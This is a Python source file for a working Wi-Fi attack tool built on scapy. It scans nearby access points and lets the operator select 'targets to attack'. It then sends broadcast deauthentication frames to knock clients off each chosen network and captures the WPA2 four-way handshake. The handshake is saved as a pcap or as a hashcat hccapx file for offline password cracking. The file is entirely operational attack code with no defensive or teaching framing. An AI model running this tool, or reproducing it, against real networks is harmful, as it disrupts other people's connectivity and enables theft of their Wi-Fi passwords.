from scapy.all import *
from scapy.layers.dot11 import *
from scapy.layers.eap import EAPOL

import os
import subprocess
import argparse
import re
import time
import sys
import select
import struct

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

formats = ["cap", "hccapx"]


class HSGrabber(dict):
    MODE_SCAN = 0
    MODE_HANDSHAKE = 1

    max_tries = 7
    trying_period = 7

    instance = None

    def __init__(self, interface_name: str, output_dir: str, save_format: str):
        super().__init__()

        self.mode = self.MODE_SCAN

        self.interface = WifiInterface(interface_name)

        self.output_dir = output_dir
        self.save_format = save_format

        self.__ap_list = []

        self.__victim_states = {}
        self.__victim_list = []

        self.__current_victim = 0

        self.__next_death_time = 0
        self.__current_try = 0

    def __next_victim(self, state: str):
        bssid = self.__victim_list[self.__current_victim]
        self.__victim_states[bssid] = state
        self.__current_victim += 1
        self.__current_try = 0
        self.__next_death_time = 0

    def __next_mode(self):
        if self.mode == self.MODE_SCAN and end_time < int(time.time()):
            self.mode = self.MODE_HANDSHAKE
            for ap in self.__ap_list:
                if len(ap.clients) > 0:
                    self.__victim_list.append(ap.bssid)
                    self.__victim_states[ap.bssid] = f"{GR}Waiting...{W}"
            return

        wrapper: io.TextIOWrapper = select.select([sys.stdin, ], [], [], 0.0)[0][0]
        wrapper.readline()
        if self.mode == self.MODE_SCAN:
            if len(self.__ap_list) == 0:
                print(f"{B}[?]{W} There aren't found AP. Do you want to stop program? (Y/N) ", end="")
                answer = input()
                if answer.lower() == 'y':
                    self.interface.close()
                else:
                    return

            self.mode = self.MODE_HANDSHAKE
            print(f"Select targets to attack. {B}They can be:{W}")
            print(f"\t{O}all{W} - all targets.")
            print(f"\t{O}id[,id2 ,id3]{W} - list of ids.")
            print(f"\t{O}only_with_clients{W} - select ap what has clients.")

            while True:
                selected = input()
                waiting_string = f"{GR}Waiting...{W}"
                if selected == "all":
                    for ap in self.__ap_list:
                        self.__victim_list.append(ap.bssid)
                        self.__victim_states[ap.bssid] = waiting_string
                    break
                elif selected == "only_with_clients":
                    for ap in self.__ap_list:
                        if len(ap.clients) > 0:
                            self.__victim_list.append(ap.bssid)
                            self.__victim_states[ap.bssid] = waiting_string
                    break
                else:
                    try:
                        selected = map(int, selected.split(','))
                        for i in selected:
                            if i >= len(self.__ap_list):
                                print(f"{R}[-]{W} There isn't AP with id '{i}'.")
                                continue
                            self.__victim_list.append(self.__ap_list[i].bssid)
                            self.__victim_states[self.__ap_list[i].bssid] = waiting_string
                        break
                    except ValueError:
                        print(f"{R}[-]{W} Incorrect input data.")

        elif self.mode == self.MODE_HANDSHAKE:
            self.__next_victim(f"{O}Skipped.{W}")

    def step(self):
        if select.select([sys.stdin, ], [], [], 0.0)[0]:
            self.__next_mode()

        if end_time < int(time.time()) and self.mode == self.MODE_SCAN:
            self.__next_mode()

        if self.mode == self.MODE_SCAN:
            new_channel = (self.interface.current_channel + 1) % (self.interface.max_channel + 1)
            self.interface.set_channel(new_channel if new_channel != 0 else 1)
            self.__ap_list = sorted(self.values(), key=lambda element: element.power.value, reverse=True)
            self.__ap_list = list(filter(lambda element: element.channel > 0, self.__ap_list))
        elif self.mode == self.MODE_HANDSHAKE:
            if self.__current_victim >= len(self.__victim_list):
                print(f"{G}[+]{W} All targets was attacked. Exiting...")
                self.interface.close()

            bssid = self.__victim_list[self.__current_victim]

            if self[bssid].captured:
                self.__next_victim(f"{G}Captured.{W}")

            if self.__next_death_time < int(time.time()) and self.__current_try >= self.max_tries:
                self.__next_victim(f"{R}Not captured.{W}")

            if self.__current_victim >= len(self.__victim_list):
                print(f"{G}[+]{W} All targets was attacked. Exiting...")
                self.interface.close()

            if self.__next_death_time < int(time.time()):
                bssid = self.__victim_list[self.__current_victim]  # May be changed in __next_victim
                self.__current_try += 1
                self.__next_death_time = int(time.time()) + self.trying_period
                self.interface.set_channel(self[bssid].channel)
                self.interface.send_deauth(self.__victim_list[self.__current_victim])

        self.print()

    def print(self):
        print_buffer = str(self.interface) + "\n\n"
        if self.mode == self.MODE_SCAN:
            print_buffer += f"Auto capturing in {end_time - int(time.time())}s\n"
        print_buffer += f" # |{'Name':^33}|  Power  | Clients | Channel\n"
        for index, ap in enumerate(self.__ap_list):
            print_buffer += f"{index:<3d}| {ap.ssid:<32}| " \
                            f"{G if ap.power.value > -45 else O if ap.power.value > -65 else R}" \
                            f"{str(ap.power):<7s}{W} | " \
                            f"{len(ap.clients):<7d} | {ap.channel:<7d}"
            if self.mode == self.MODE_HANDSHAKE and ap.bssid in self.__victim_list:
                print_buffer += f'{R}[{self.__current_try}/{self.max_tries}] ' \
                                f'{B}Capturing handshakes. ' \
                                f'Next death message in {self.__next_death_time - int(time.time())}s.{W}' \
                    if self.__victim_list[self.__current_victim] == ap.bssid \
                    else self.__victim_states[ap.bssid]
            print_buffer += "\n"
        if self.mode == self.MODE_SCAN:
            print_buffer += f"Press {B}[Enter]{W} to go to the next stage.\n"
        elif self.mode == self.MODE_HANDSHAKE:
            print_buffer += f"Press {B}[Enter]{W} to skip this AP.\n"
        os.system('clear')
        sys.stdout.write(print_buffer)

    def __getitem__(self, item: str):
        if item not in self:
            super(HSGrabber, self).__setitem__(item, AccessPoint(item,
                                                                 output_dir=self.output_dir,
                                                                 save_format=self.save_format))
        return super(HSGrabber, self).__getitem__(item)

    def close(self):
        self.interface.close()


class WifiInterface:

    def __init__(self, name: str):
        self.name = name

        if not self.exists():
            raise ValueError(f"Interface '{name}' doesn't exist")

        self.current_channel = 0
        self.max_channel = 0
        self.monitor = False
        self.update_info()

    def exists(self) -> bool:
        proc = subprocess.Popen(["iwconfig", self.name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return not proc.communicate()[1] != b""

    def update_info(self):
        proc = subprocess.Popen(["iwconfig", self.name], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        matches = re.findall(rb"Mode:(\w+) ", proc.communicate()[0])
        self.monitor = matches[0] == b"Monitor"

        proc = subprocess.Popen(["iwlist", self.name, "channel"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        output = proc.communicate()[0]
        matches = re.findall(rb"(\d+) channels in total", output)
        self.max_channel = int(matches[0])

        if self.monitor:
            matches = re.findall(rb"\(Channel (\d+)\)", output)
            if len(matches) == 0:
                self.set_channel(1)
            else:
                self.current_channel = int(matches[0])

    def set_mode(self, monitor: bool = False):
        if monitor == self.monitor:
            return
        mode_name = 'Monitor' if monitor else 'Managed'
        print(f"{B}[\\]{W} Changing interface mode to '{C}{mode_name}{W}'", end='\r')
        subprocess.Popen(["ifconfig", self.name, "down"], stdout=subprocess.DEVNULL)
        if monitor:
            subprocess.Popen(['iw', self.name, 'set', 'monitor', 'control'], stdout=subprocess.DEVNULL)
            self.update_info()
        else:
            subprocess.Popen(['iw', self.name, 'set', 'type', 'managed'], stdout=subprocess.DEVNULL)
        subprocess.Popen(['ifconfig', self.name, 'up'], stdout=subprocess.DEVNULL)
        print(f"\r{G}[+]{W} Interface mode changed to '{C}{mode_name}{W}' ")

    def set_channel(self, channel: int) -> bool:
        if channel > self.max_channel or channel < 1:
            print(f"{R}[-]{W} Channel must be from 1 to {self.max_channel}, but was given {channel}.")

        proc = subprocess.Popen(["iwconfig", self.name, "channel", str(channel)], stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        error = proc.communicate()[1]
        if error != b"":
            print(f"{R}[-]{W} Failed to change wifi channel: {error.decode()}")
            return False

        self.current_channel = channel
        return True

    def close(self):
        self.set_mode(False)
        exit()

    def send_deauth(self, target: str):
        deauth_pkt = RadioTap() \
                     / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target) \
                     / Dot11Deauth()
        sendp(deauth_pkt, count=4, iface=self.name, verbose=0)

    def __str__(self):
        return f"Name: {self.name} | Mode: {'Monitor' if self.monitor else 'Managed'} | " \
               f"Channel: {self.current_channel if self.current_channel != 0 else '-'}/{self.max_channel}"


class AccessPoint:
    class Power:
        def __init__(self, power: int = -100):
            self.value = power
            self.__in_process = []
            self.__last_check = 0

        def update(self, power: int):
            if not isinstance(power, int):
                return

            self.__in_process.append(power)

            curr_time = int(time.time())

            if 0 < self.__last_check < curr_time:
                self.value = max(self.__in_process)
                self.__in_process.clear()
            self.__last_check = int(time.time())

        def __str__(self):
            return f"{self.value}db"

    def __init__(self, bssid: str, ssid: str = "<Unknown>", output_dir: str = ".", save_format: str = "cap"):
        self.bssid = bssid
        self.ssid = ssid

        self.save_format = save_format
        self.output_dir = output_dir

        self.power = self.Power()

        self.captured = False

        self.clients = {}
        self.channel = -1

    def process_packet(self, pkt: RadioTap):
        if pkt.haslayer(Dot11EltDSSSet):
            self.channel = pkt[Dot11EltDSSSet].channel

        if pkt.haslayer(Dot11Beacon):
            try:
                self.ssid = pkt[Dot11Elt][0].info.decode()
            except ValueError:
                pass
        if self.channel == -1 or self.channel == HSGrabber.instance.interface.current_channel:
            self.power.update(pkt.dBm_AntSignal)

        sta = None
        ap = None
        if pkt.FCfield == "from-DS":
            sta = pkt.addr1
            ap = pkt.addr2
        elif pkt.FCfield == "to-DS":
            sta = pkt.addr2
            ap = pkt.addr1

        if sta is not None and sta not in self.clients:
            self.clients[sta] = Handshake()

        if not self.captured and pkt.haslayer(EAPOL) and sta is not None:
            handshake: Handshake = self.clients[sta]
            handshake.update(pkt, ap)
            if handshake.completed:
                handshake.save(self.output_dir, self.save_format, self.ssid)
                self.captured = True

    def __str__(self):
        return f"Name: {self.ssid} | " \
               f"Power: {self.power} | " \
               f"Clients: {len(self.clients)} | " \
               f"Captured: {'Yes' if self.captured else 'No'} | " \
               f"Channel: {self.channel}"


class Handshake:
    __stages = {b'\x02\x00\x8a': 0, b'\x02\x01\n': 1, b'\x02\x13\xca': 2, b"\x02\x03\n": 3}

    # (first_message_id, second_message_id): (message_pair_value, source_of_EAPOL_and_KEY_MIC)
    __handshake_opt = {
        (0, 1): 0,
        (0, 3): 1,
        (2, 1): 2,
        (2, 3): 5
    }

    def __init__(self):
        # It will contains two EAPOL key frames and their id: AP frame and STA frame
        # Element format (id, frame)
        self.__frames = [RadioTap(), RadioTap()]

        # Last received stage
        self.__last_stage_id = -1

        # Time of last received stage
        self.__last_stage_time = 0

        # Is handshake is completed, i.e. it contains all required frames for writing
        self.completed = False

    def update(self, frame: Dot11, ap: str):
        key_raw: Dot11 = frame.getlayer(Raw)
        current_stage = self.__stages[key_raw.load[:3]]

        if self.completed:
            return
        if self.__last_stage_id >= current_stage or 0 < self.__last_stage_time < frame.time - 2:
            self.__last_stage_id = -1
            self.__last_stage_time = 0
            self.__frames = [RadioTap(), RadioTap()]

        self.__frames[frame.addr1 == ap] = frame
        self.__last_stage_time = frame.time
        self.__last_stage_id = current_stage
        self.completed = self.__frames[0].payload and self.__frames[1].payload

    def save(self, output_folder: str, fmt: str, ssid: str = ""):
        if not self.completed:
            raise Exception("Handshake is not completed.")

        ap = self.__frames[1].addr1
        filename = output_folder + "/" + ssid + " | " + ap + "." + fmt
        file = open(filename, "wb")  # Open file in 'w' mode to clear it
        if fmt == "cap":
            file.close()
            for frame in self.__frames:
                wrpcap(filename, frame, append=True)
        elif fmt == "hccapx":
            ap_key_raw: Raw = self.__frames[0].getlayer(Raw)
            sta_key_raw: Raw = self.__frames[1].getlayer(Raw)

            header = b"HCPX"
            hccap_version = 4
            message_pair = self.__handshake_opt[
                (self.__stages[ap_key_raw.load[:3]], self.__stages[sta_key_raw.load[:3]])]

            key_version = 2  # WPA2
            key_mic = sta_key_raw.load[77:93]

            ap_mac = self.__mac_to_bytes(self.__frames[1].getlayer(Dot11).addr1)
            ap_nonce = ap_key_raw.load[13:45]

            sta_mac = self.__mac_to_bytes(self.__frames[0].getlayer(Dot11).addr1)
            sta_nonce = sta_key_raw.load[13:45]

            eapol_raw = self.__get_eapol(self.__frames[1])

            file.write(header
                       + struct.pack("I", hccap_version)
                       + struct.pack("B", message_pair)
                       + struct.pack("B", len(ssid))
                       + struct.pack("32s", ssid.encode())
                       + struct.pack("B", key_version)
                       + struct.pack("16s", key_mic)
                       + struct.pack("6s", ap_mac)
                       + struct.pack("32s", ap_nonce)
                       + struct.pack("6s", sta_mac)
                       + struct.pack("32s", sta_nonce)
                       + struct.pack("H", len(eapol_raw))
                       + struct.pack("256s", eapol_raw))
            file.close()

    @staticmethod
    def __get_eapol(frame: Dot11):
        raw_bytes = frame.getlayer(Raw).load
        raw_bytes = raw_bytes[:77] + 16 * b"\x00" + raw_bytes[93:]
        return \
            struct.pack("B", frame.getlayer(EAPOL).version) + \
            struct.pack("B", frame.getlayer(EAPOL).type) + \
            struct.pack(">H", frame.getlayer(EAPOL).len) + \
            raw_bytes

    @staticmethod
    def __mac_to_bytes(mac: str):
        return bytes(map(lambda mac_part: int(mac_part, 16), mac.split(":")))


def ap_scan_callback(frame):
    frame: Packet
    if frame.haslayer(Dot11FCS) or frame.haslayer(Dot11):
        ap = None
        if frame.haslayer(Dot11Beacon):
            ap = frame.addr3
        if frame.FCfield == "from-DS":
            ap = frame.addr2
        elif frame.FCfield == "to-DS":
            ap = frame.addr1
        if ap is not None:
            HSGrabber.instance[ap].process_packet(frame)


end_time = 0
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Tool for automating getting EAPOL handshakes')

    parser.add_argument('interface', metavar='iface', type=str,
                        help='Wifi interface for scanning.')

    parser.add_argument('output', type=str,
                        help='Output dir for captured handshakes.')

    parser.add_argument('-f', '--format', dest='format', type=str,
                        default=formats[0],
                        help='File saves format. Can be: ' + ', '.join(formats))

    args = parser.parse_args()

    if not os.geteuid() == 0:
        print(f"{R}[-] {W}This program needs root privileges.")
        exit()
    if not os.path.exists(args.output):
        print(f"{R}[-] {W}Output path doesn't exits.")
        exit()
    if not os.path.isdir(args.output):
        print(f"{R}[-] {W}Output path isn't directory.")
        exit()
    if args.format not in formats:
        print(f"{R}[-] {W}Incorrect format.")
        exit()

    end_time = int(time.time()) + 480
    try:
        grabber = HSGrabber(args.interface, args.output, args.format)
        HSGrabber.instance = grabber
        grabber.interface.set_mode(True)

        sniff = AsyncSniffer(iface=grabber.interface.name, prn=ap_scan_callback, store=False)
        sniff.start()
        try:
            while True:
                time.sleep(1)

                if isinstance(sniff.thread, Thread) and not sniff.thread.is_alive():
                    print(f"{R}[-] {W} Capturing packets occurs error.")
                    raise KeyboardInterrupt()

                grabber.step()
        except KeyboardInterrupt:
            sniff.stop()
            grabber.close()

    except ValueError as e:
        print(f"{R}[-] {W}Failed to get interface: {e}")
